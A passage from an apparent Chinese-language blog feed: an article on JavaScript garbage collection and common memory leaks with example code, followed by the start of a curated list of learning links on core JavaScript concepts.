console.log(&quot;click&quot;);};复制代码</code></pre><p>上面这种JS写法再普通不过了，创建一个DOM元素并绑定一个点击事件。 此时变量 div 有事件处理函数的引用，同时事件处理函数也有div的引用！（div变量可在函数内被访问）。 一个循序引用出现了，按上面所讲的算法，该部分内存无可避免的泄露了。</p><p>为了解决循环引用造成的问题，现代浏览器通过使用标记清除算法来实现垃圾回收。</p><h3 id="标记清除算法"><a href="#标记清除算法" class="headerlink" title="标记清除算法"></a>标记清除算法</h3><p>标记清除算法将“不再使用的对象”定义为“无法达到的对象”。 简单来说，就是从根部（在JS中就是全局对象）出发定时扫描内存中的对象。 凡是能从根部到达的对象，都是还需要使用的。 那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。</p><p>从这个概念可以看出，无法触及的对象包含了没有引用的对象这个概念（没有任何引用的对象也是无法触及的对象）。 但反之未必成立。</p><p>工作流程：</p><ol><li>垃圾收集器会在运行的时候会给存储在内存中的所有变量都加上标记。</li><li>从根部出发将能触及到的对象的标记清除。</li><li>那些还存在标记的变量被视为准备删除的变量。</li><li>最后垃圾收集器会执行最后一步内存清除的工作，销毁那些带标记的值并回收它们所占用的内存空间。</li></ol><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/neicun.gif" alt="img"></p><h4 id="循环引用不再是问题了"><a href="#循环引用不再是问题了" class="headerlink" title="循环引用不再是问题了"></a>循环引用不再是问题了</h4><p>再看之前循环引用的例子：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> o2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  o<span class="token punctuation">.</span>a <span class="token operator">=</span> o2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// o 引用 o2</span>  o2<span class="token punctuation">.</span>a <span class="token operator">=</span> o<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// o2 引用 o</span>  <span class="token keyword">return</span> <span class="token string">"azerty"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数调用返回之后，两个循环引用的对象在垃圾收集时从全局对象出发无法再获取他们的引用。 因此，他们将会被垃圾回收器回收。</p><h2 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>程序的运行需要内存。只要程序提出要求，操作系统或者运行时（runtime）就必须供给内存。</p><p>对于持续运行的服务进程（daemon），必须及时释放不再用到的内存。 否则，内存占用越来越高，轻则影响系统性能，重则导致进程崩溃。</p><p>本质上讲,内存泄漏就是由于疏忽或错误造成程序未能释放那些已经不再使用的内存，造成内存的浪费。</p><h3 id="常见的JS内存泄露"><a href="#常见的JS内存泄露" class="headerlink" title="常见的JS内存泄露"></a>常见的JS内存泄露</h3><h4 id="1-意外的全局变量"><a href="#1-意外的全局变量" class="headerlink" title="1.意外的全局变量"></a>1.意外的全局变量</h4><p>JavaScript 处理未定义变量的方式比较宽松：未定义的变量会在全局对象创建一个新变量。在浏览器中，全局对象是 window 。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>     bar <span class="token operator">=</span> <span class="token string">"this is a hidden global variable"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>事实上变量bar被解释成下面的情况：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>     window<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token string">"this is a hidden global variable"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>函数 <code>foo</code> 内部忘记使用 <code>var</code> ，意外创建了一个全局变量。此例泄露了一个简单的字符串，无伤大雅，但是有更糟的情况。</p><p>由this创建的意外的全局变量：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>variable <span class="token operator">=</span> <span class="token string">"potential accidental global"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// Foo 调用自己，this 指向了全局对象（window） </span><span class="token comment" spellcheck="true">// 而不是 undefined </span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>在 JavaScript 文件头部加上</code>‘use strict’<code>，可以避免此类错误发生。启用严格模式解析 JavaScript ，避免意外的全局变量。</code></p><p><strong>全局变量使用注意事项</strong></p><ol><li>尽管我们讨论了一些意外的全局变量，但是仍有一些明确的全局变量产生的垃圾。它们被定义为不可回收（除非定义为空或重新分配）。</li><li>全局变量用于 临时存储和处理大量信息时，需要多加小心。如果必须使用全局变量存储大量数据时，确保用完以后把它设置为 null 或者重新定义</li><li>与全局变量相关的增加内存消耗的一个主因是缓存。缓存数据是为了重用，缓存必须有一个大小上限才有用。</li><li>高内存消耗导致缓存突破上限，因为缓存内容无法被回收。</li></ol><h4 id="2-没有释放的计时器或者回调函数"><a href="#2-没有释放的计时器或者回调函数" class="headerlink" title="2.没有释放的计时器或者回调函数"></a>2.没有释放的计时器或者回调函数</h4><p>在 JavaScript 中使用 setInterval 非常平常。一段常见的代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> someResource <span class="token operator">=</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">var</span> node <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'Node'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 处理 node 和 someResource </span>        node<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>someResource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与节点或数据关联的计时器不再需要，<code>node</code> 对象可以删除，整个回调函数也不需要了。可是，计时器回调函数仍然没被回收（计时器停止才会被回收）。同时，<code>someResource</code> 如果存储了大量的数据，也是无法被回收的。</p><p>对于观察者的例子，一旦它们不再需要（或者关联的对象变成不可达），明确地移除它们非常重要。老的 IE 6 是无法处理循环引用的。如今，即使没有明确移除它们，一旦观察者对象变成不可达，大部分浏览器是可以回收观察者处理函数的。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">onClick</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>     element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> element<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> onClick<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>对象观察者和循环引用注意事项</strong></p><p>老版本的 IE 是无法检测 DOM 节点与 JavaScript 代码之间的循环引用，会导致内存泄露。如今，现代的浏览器（包括 IE 和 Microsoft Edge）使用了更先进的垃圾回收算法，已经可以正确检测和处理循环引用了。换言之，回收节点内存时，不必非要调用 removeEventListener 了。</p><h4 id="3-脱离DOM的引用"><a href="#3-脱离DOM的引用" class="headerlink" title="3.脱离DOM的引用"></a>3.脱离DOM的引用</h4><p>有时，保存 DOM 节点内部数据结构很有用。假如你想快速更新表格的几行内容，把每一行 DOM 存成字典（JSON 键值对）或者数组很有意义。此时，同样的 DOM 元素存在两个引用：一个在 DOM 树中，另一个在字典中。将来你决定删除这些行时，需要把两个引用都清除。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> elements <span class="token operator">=</span> <span class="token punctuation">{</span>     button<span class="token punctuation">:</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     image<span class="token punctuation">:</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     text<span class="token punctuation">:</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">doStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     image<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://some.url/image'</span><span class="token punctuation">;</span>     button<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 更多逻辑 </span><span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">removeButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 按钮是 body 的后代元素 </span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 此时，仍旧存在一个全局的 #button 的引用 </span>    <span class="token comment" spellcheck="true">// elements 字典。button 元素仍旧在内存中，不能被 GC 回收。 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此外还要考虑 DOM 树内部或子节点的引用问题。假如你的 JavaScript 代码中保存了表格某一个 <td> 的引用。将来决定删除整个表格的时候，直觉认为 GC 会回收除了已保存的 </td><td> 以外的其它节点。实际情况并非如此：此</td><td> 是表格的子节点，子元素与父元素是引用关系。由于代码保留了 </td><td> 的引用，导致整个表格仍待在内存中。保存 DOM 元素引用的时候，要小心谨慎。</td></p><h4 id="4-闭包"><a href="#4-闭包" class="headerlink" title="4.闭包"></a>4.闭包</h4><p>闭包是 JavaScript 开发的一个关键方面：匿名函数可以访问父级作用域的变量。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> theThing <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token keyword">var</span> replaceThing <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">var</span> originalThing <span class="token operator">=</span> theThing<span class="token punctuation">;</span>   <span class="token keyword">var</span> unused <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>originalThing<span class="token punctuation">)</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span>   theThing <span class="token operator">=</span> <span class="token punctuation">{</span>     longStr<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     someMethod<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>someMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>replaceThing<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次调用 replaceThing ，theThing 得到一个包含一个大数组和一个新闭包（someMethod）的新对象。同时，变量 unused 是一个引用 originalThing 的闭包（先前的 replaceThing 又调用了 theThing ）。思绪混乱了吗？最重要的事情是，闭包的作用域一旦创建，它们有同样的父级作用域，作用域是共享的。someMethod 可以通过 theThing 使用，someMethod 与 unused 分享闭包作用域，尽管 unused从未使用，它引用的 originalThing 迫使它保留在内存中（防止被回收）。当这段代码反复运行，就会看到内存占用不断上升，垃圾回收器（GC）并无法降低内存占用。本质上，闭包的链表已经创建，每一个闭包作用域携带一个指向大数组的间接的引用，造成严重的内存泄露。</p><h3 id="避免内存泄露"><a href="#避免内存泄露" class="headerlink" title="避免内存泄露"></a>避免内存泄露</h3><p>记住一个原则：不用的东西，及时归还。</p><ol><li>减少不必要的全局变量，使用严格模式避免意外创建全局变量。</li><li>在你使用完数据后，及时解除引用（闭包中的变量，dom引用，定时器清除）。</li><li>组织好你的逻辑，避免死循环等造成浏览器卡顿，崩溃的问题。</li></ol>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> RAM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端开发JavaScript你必须懂得的33个概念</title>
      <link href="2019/09/12/jsidea/"/>
      <url>2019/09/12/jsidea/</url>
      
        <content type="html"><![CDATA[<h2 id="1-调用堆栈"><a href="#1-调用堆栈" class="headerlink" title="1. 调用堆栈"></a>1. 调用堆栈</h2><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Call_stack" target="_blank" rel="noopener">Call Stack — MDN</a></li><li>📖 <a href="https://juejin.im/post/5a05b4576fb9a04519690d42" target="_blank" rel="noopener">[译] JavaScript 如何工作：对引擎、运行时、调用堆栈的概述 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/5ba32171f265da0ab719a6d7" target="_blank" rel="noopener">[译] 理解 JavaScript 中的执行上下文和执行栈 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制 —— 掘金</a></li><li>📖 <a href="https://www.oschina.net/translate/how-does-javascript-actually-work-part-1" target="_blank" rel="noopener">解读 JavaScript 之引擎、运行时和堆栈调用 —— 开源中国</a></li><li>📖 <a href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/" target="_blank" rel="noopener">Tasks, microtasks, queues and schedules —— Jake Archibald</a></li><li>📖 <a href="https://juejin.im/entry/55dbd51a60b2f3a92a8f5bff" target="_blank" rel="noopener">Tasks, microtasks, queues and schedules（译） —— 掘金</a></li></ul><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://v.qq.com/x/page/h0372bld8re.html?ptag=qqbrowser" target="_blank" rel="noopener">What is the event loop anyway? —— 腾讯视频(英文字幕)</a></li><li>📺 <a href="https://www.bilibili.com/video/av33824933/" target="_blank" rel="noopener">Understanding The JavaScript Call Stack, Event Queue, Event Table, &amp; Event Loop —— Bilibili</a></li><li>📺 <a href="http://www.acfun.cn/v/ac4495641" target="_blank" rel="noopener">JS 中的变量提升、堆栈内存及闭包详解 —— Acfun</a></li><li>📺 <a href="http://www.php.cn/code/21194.html" target="_blank" rel="noopener">事件循环模型 —— PHP 中文网</a></li><li>📺 <a href="https://www.youtube.com/watch?v=w6QGEiQceOM" target="_blank" rel="noopener">Javascript: the Call Stack explained — Coding Blocks India</a></li><li>📺 <a href="https://www.youtube.com/watch?v=W8AeMrVtFLY" target="_blank" rel="noopener">The JS Call Stack Explained In 9 Minutes — Colt Steele</a></li><li>📺 <a href="https://www.youtube.com/watch?v=jT0USJeNFEA" target="_blank" rel="noopener">JavaScript Execution Stack — Codecademy</a></li><li>📺 <a href="https://www.youtube.com/watch?v=w7QWQlkLY_s" target="_blank" rel="noopener">What is the Call Stack? — Eric Traub</a></li><li>📺 <a href="https://www.youtube.com/watch?v=Q2sFmqvpBe0" target="_blank" rel="noopener">The Call Stack — Kevin Drumm</a></li><li>📺 <a href="https://www.youtube.com/watch?v=Z6a1cLyq7Ac&list=PLWrQZnG8l0E4kd1T_nyuVoxQUaYEWFgcD" target="_blank" rel="noopener">Understanding JavaScript Execution — Codesmith</a></li><li>📺 <a href="https://www.youtube.com/watch?v=mk0lu9MKBto" target="_blank" rel="noopener">Call Stack &amp; Event Loop — movies com</a></li></ul><hr><h2 id="2-原始类型"><a href="#2-原始类型" class="headerlink" title="2. 原始类型"></a>2. 原始类型</h2><h3 id="文章-1"><a href="#文章-1" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Primitive" target="_blank" rel="noopener">原始数据 —— MDN</a></li><li>📖 <a href="https://segmentfault.com/a/1190000017090272" target="_blank" rel="noopener">[译]JavaScript 是怎样编码数字的 —— SegmentFault</a></li><li>📖 <a href="https://yanhaijing.com/javascript/2014/03/14/what-every-javascript-developer-should-know-about-floating-points/" target="_blank" rel="noopener">每一个 JavaScript 开发者应该了解的浮点知识 —— 颜海镜</a></li><li>📖 <a href="https://wangdoc.com/javascript/types/number.html" target="_blank" rel="noopener">JavaScript 标准参考教程(基本语法之数值) —— 阮一峰</a></li><li>📖 <a href="https://javascriptweblog.wordpress.com/2010/09/27/the-secret-life-of-javascript-primitives/" target="_blank" rel="noopener">The Secret Life of JavaScript Primitives —— Angus Croll</a></li></ul><h3 id="视频-1"><a href="#视频-1" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.imooc.com/video/5674" target="_blank" rel="noopener">javascript 六种数据类型 —— 慕课网</a></li><li>📺 <a href="http://www.php.cn/code/5808.html" target="_blank" rel="noopener">javascript 视频教程(数据类型) —— PHP 中文网</a></li><li>📺 <a href="https://www.youtube.com/watch?v=9ooYYRLdg_g" target="_blank" rel="noopener">JavaScript Reference vs Primitive Types — Academind</a></li><li>📺 <a href="https://www.youtube.com/watch?v=HsbWQsSCE5Y" target="_blank" rel="noopener">JavaScript Primitive Types — Simon Sez IT</a></li><li>📺 <a href="https://www.youtube.com/watch?v=F7YbhKbpFic" target="_blank" rel="noopener">Javascript Primitive and Reference Types — Baljeet Singh</a></li><li>📺 <a href="https://www.youtube.com/watch?v=e-_mDyqm2oU" target="_blank" rel="noopener">Value Types and Reference Types in JavaScript — Programming with Mosh</a></li><li>📺 <a href="https://www.youtube.com/watch?v=qw3j0A3DIzQ" target="_blank" rel="noopener">JavaScript Primitive Data Types — Avelx</a></li><li>📺 <a href="https://www.youtube.com/watch?v=MqHDDtVYJRI" target="_blank" rel="noopener">Everything you never wanted to know about JavaScript numbers — Bartek Szopka</a></li></ul><hr><h2 id="3-值类型和引用类型"><a href="#3-值类型和引用类型" class="headerlink" title="3. 值类型和引用类型"></a>3. 值类型和引用类型</h2><h3 id="文章-2"><a href="#文章-2" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://www.w3school.com.cn/js/pro_js_referencetypes.asp" target="_blank" rel="noopener">ECMAScript 引用类型 —— W3school</a></li><li>📖 <a href="https://www.cnblogs.com/leiting/p/8081413.html" target="_blank" rel="noopener">js 中的值类型和引用类型的区别 —— 博客园</a></li><li>📖 <a href="https://blog.fundebug.com/2017/08/09/explain_value_reference_in_js/" target="_blank" rel="noopener">JavaScript 的值传递和引用传递 —— FunDebug</a></li><li>📖 <a href="https://docstore.mik.ua/orelly/webprog/jscript/ch04_04.htm" target="_blank" rel="noopener">Primitive Types &amp; Reference Types in JavaScript —— Bran van der Meer</a></li><li>📖 <a href="https://blog.csdn.net/xiaojia_boke/article/details/54906509" target="_blank" rel="noopener">JavaScript: Passing by Value or by Reference —— CSDN</a></li><li>📖 <a href="https://segmentfault.com/a/1190000015411195" target="_blank" rel="noopener">js 值引用和值复制 —— SegmentFault</a></li><li>📖 <a href="https://blog.csdn.net/zzzaquarius/article/details/4902235" target="_blank" rel="noopener">js- 引用和复制(传值和传址) —— CSDN</a></li></ul><h3 id="视频-2"><a href="#视频-2" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.youtube.com/watch?v=E-dAnFdq8k8" target="_blank" rel="noopener">Javascript Pass by Value vs Pass by Reference — techsith</a></li><li>📺 <a href="https://www.youtube.com/watch?v=fD0t_DKREbE" target="_blank" rel="noopener">JavaScript Value vs Reference Types — Programming with Mosh</a></li></ul><hr><h2 id="4-隐式-显式-名义和鸭子类型"><a href="#4-隐式-显式-名义和鸭子类型" class="headerlink" title="4. 隐式, 显式, 名义和鸭子类型"></a>4. 隐式, 显式, 名义和鸭子类型</h2><h3 id="文章-3"><a href="#文章-3" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://www.w3school.com.cn/js/pro_js_typeconversion.asp" target="_blank" rel="noopener">ECMAScript 类型转换 —— W3school</a></li><li>📖 <a href="http://justjavac.com/javascript/2013/04/08/javascript-quirk-1-implicit-conversion-of-values.html" target="_blank" rel="noopener">JavaScript 的怪癖 1：隐式类型转换 —— justjavac</a></li><li>📖 <a href="https://juejin.im/post/59ad2585f265da246a20e026" target="_blank" rel="noopener">JavaScript 运算符规则与隐式类型转换详解 —— 掘金</a></li><li>📖 <a href="https://segmentfault.com/a/1190000004482388" target="_blank" rel="noopener">聊一聊 JS 中的隐式类型转换 —— SegmentFault</a></li><li>📖 <a href="https://www.cnblogs.com/yugege/p/5277883.html" target="_blank" rel="noopener">有趣的 JavaScript 隐式类型转换 —— 博客园</a></li><li>📖 <a href="https://blog.csdn.net/yangjvn/article/details/48284163" target="_blank" rel="noopener">JavaScript 显式类型转换与隐式类型转换 —— CSDN</a></li><li>📖 <a href="https://www.jianshu.com/p/777a89b4ed9a" target="_blank" rel="noopener">你不知道的 JavaScript（中卷）强制类型转换 —— 简书</a></li><li>📖 <a href="https://ithelp.ithome.com.tw/articles/10201512" target="_blank" rel="noopener">你懂 JavaScript 嗎？#8 強制轉型 —— cythilya</a></li><li>📖 <a href="http://book.51cto.com/art/201505/475153.htm" target="_blank" rel="noopener">动态类型语言和鸭子类型 —— 曾探</a></li><li>📖 <a href="https://flow.org/en/docs/lang/nominal-structural/" target="_blank" rel="noopener">Nominal &amp; Structural Typing —— flow</a></li><li>📖 <a href="https://stackoverflow.com/questions/19915688/what-exactly-is-type-coercion-in-javascript" target="_blank" rel="noopener">What exactly is Type Coercion in Javascript? —— stackoverflow</a></li><li>📖 [You Don’t Know JS: Types &amp; Grammar —— github](<a href="https://github.com/getify/You-Dont-Know-JS/blob/master/types" target="_blank" rel="noopener">https://github.com/getify/You-Dont-Know-JS/blob/master/types</a> &amp; grammar/ch4.md)</li></ul><h3 id="视频-3"><a href="#视频-3" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.imooc.com/video/5675" target="_blank" rel="noopener">javascript 隐式转换 —— 慕课网</a></li><li>📺 <a href="http://www.le.com/ptv/vplay/27767009.html" target="_blank" rel="noopener">Javascript 基础加强-类型转换 —— 黑马程序员</a></li></ul><hr><h2 id="5-vs-typeof-vs-instanceof"><a href="#5-vs-typeof-vs-instanceof" class="headerlink" title="5. == vs ===, typeof vs instanceof"></a>5. == vs ===, typeof vs instanceof</h2><h3 id="文章-4"><a href="#文章-4" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">JavaScript 中的相等性判断 —— MDN</a></li><li>📖 <a href="https://juejin.im/entry/584918612f301e005716add6" target="_blank" rel="noopener">js 中 == 和 === 的区别 —— 掘金</a></li><li>📖 <a href="https://blog.csdn.net/w97531/article/details/82255225" target="_blank" rel="noopener">== vs === in Javascript —— CSDN</a></li><li>📖 <a href="https://blog.csdn.net/mevicky/article/details/50353881" target="_blank" rel="noopener">深入理解 javascript 之 typeof 和 instanceof —— CSDN</a></li><li>📖 <a href="http://justjavac.com/javascript/2012/12/23/what-is-javascripts-typeof-operator-used-for.html" target="_blank" rel="noopener">JavaScript 的 typeof 的用途 —— justjavac</a></li><li>📖 <a href="https://juejin.im/post/58358606570c35005e4142bd" target="_blank" rel="noopener">一张图看懂 Function 和 Object 的关系及简述 instanceof 运算符 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/5b0b9b9051882515773ae714" target="_blank" rel="noopener">浅谈 instanceof 和 typeof 的实现原理 —— 掘金</a></li><li>📖 <a href="https://segmentfault.com/a/1190000000730982" target="_blank" rel="noopener">typeof 和 instanceOf 的区别</a></li></ul><hr><h2 id="6-this-call-apply-和-bind"><a href="#6-this-call-apply-和-bind" class="headerlink" title="6. this, call, apply 和 bind"></a>6. this, call, apply 和 bind</h2><h3 id="文章-5"><a href="#文章-5" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://www.ruanyifeng.com/blog/2010/04/using_this_keyword_in_javascript.html" target="_blank" rel="noopener">Javascript 的 this 用法 —— 阮一峰</a></li><li>📖 <a href="https://www.jianshu.com/p/6b4333e78bf5" target="_blank" rel="noopener">学会 JS 的 this 这一篇就够了，根本不用记 —— 简书</a></li><li>📖 <a href="https://juejin.im/post/5b9f176b6fb9a05d3827d03f" target="_blank" rel="noopener">[译] this（他喵的）到底是什么 — 理解 JavaScript 中的 this、call、apply 和 bind —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/59bfe84351882531b730bac2" target="_blank" rel="noopener">this、apply、call、bind —— 掘金</a></li><li>📖 <a href="https://www.cnblogs.com/tingyu-blog/p/6212392.html" target="_blank" rel="noopener">使用 call、apply 和 bind 解决 js 中烦人的 this，事件绑定时的 this 和传参问题 —— 博客园</a></li><li>📖 <a href="https://github.com/Abiel1024/blog/issues/16" target="_blank" rel="noopener">call、apply 和 bind 的原生实现 —— github</a></li></ul><h3 id="视频-4"><a href="#视频-4" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.iqiyi.com/w_19rr1augsd.html" target="_blank" rel="noopener">JavaScript 关于 this 关键字解释 —— 爱奇艺</a></li><li>📺 <a href="http://baidu.iqiyi.com/watch/845335533383874688.html?page=videoMultiNeed" target="_blank" rel="noopener">JS 关于作用域闭包和 this 的综合面试题 —— 百度视频</a></li><li>📺 <a href="http://www.le.com/ptv/vplay/27478413.html?ch=baidu_s" target="_blank" rel="noopener">js 面向对象闭包数组 12.函数中的 this —— 乐视视频</a></li><li>📺 <a href="http://www.le.com/ptv/vplay/24835911.html?ch=baidu_s" target="_blank" rel="noopener">1.3.10-this 指向及 this 应用 —— 乐视视频</a></li><li>📺 <a href="https://study.163.com/course/introduction/590005.htm" target="_blank" rel="noopener">珠峰培训 JavaScript 开发课程：关于 this 关键字、闭包作用域 —— 网易云课堂</a></li></ul><hr><h2 id="7-函数作用域-块级作用域和词法作用域"><a href="#7-函数作用域-块级作用域和词法作用域" class="headerlink" title="7. 函数作用域, 块级作用域和词法作用域"></a>7. 函数作用域, 块级作用域和词法作用域</h2><h3 id="文章-6"><a href="#文章-6" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014344993159773a464f34e1724700a6d5dd9e235ceb7c000" target="_blank" rel="noopener">变量作用域与解构赋值 —— 